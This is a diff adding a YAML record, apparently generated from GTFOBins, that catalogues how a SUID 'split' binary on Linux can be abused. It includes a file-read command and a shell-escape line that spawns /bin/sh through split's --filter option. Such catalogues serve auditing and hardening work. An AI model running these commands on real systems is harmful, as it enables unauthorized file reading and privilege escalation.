@@ -1,0 +1,102 @@
+id: gtfobins/split/file-read/suid
+type: binary
+platform: linux
+name: split
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'split -b 999 --additional-suffix suffix /path/to/input-file prefix
+
+    cat prefixaasuffix'
+  comment: This copies the input file in the current working directory in a file named `prefixaasuffix`,
+    just make sure to pick a value big enough, instead of `999`.
+references:
+- https://gtfobins.github.io/gtfobins/split/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        split:
+          functions:
+            file-read:
+            - code: 'split -b 999 --additional-suffix suffix /path/to/input-file prefix
+
+                cat prefixaasuffix'
+              comment: This copies the input file in the current working directory in a file named `prefixaasuffix`,
+                just make sure to pick a value big enough, instead of `999`.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: The `--additional-suffix` flag is only available in the GNU version.
+            file-write:
+            - code: split -b 999 --additional-suffix suffix /path/to/input-file prefix
+              comment: This copies the input file in the current working directory in a file named `prefixaasuffix`,
+                just make sure to pick a value big enough, instead of `999`.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: The `--additional-suffix` flag is only available in the GNU version.
+            shell:
+            - code: split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/split/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:3441c2c3f327f5adeb641d95819c26873f470209fb99a6aa6a0726c808db7228
